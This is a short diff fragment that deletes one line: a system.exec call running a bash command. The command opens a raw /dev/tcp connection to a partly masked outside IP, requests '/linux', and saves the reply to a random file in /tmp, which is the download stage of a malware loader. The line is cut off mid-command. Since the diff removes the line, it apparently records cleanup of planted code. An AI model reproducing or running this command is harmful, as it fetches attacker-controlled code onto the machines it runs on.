@@ -1,1 +1,0 @@
-system.exec "bash -c \"exec 6<>/dev/tcp/8.145.34.XXX/60106 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/SCUxMcvnJ3 &&
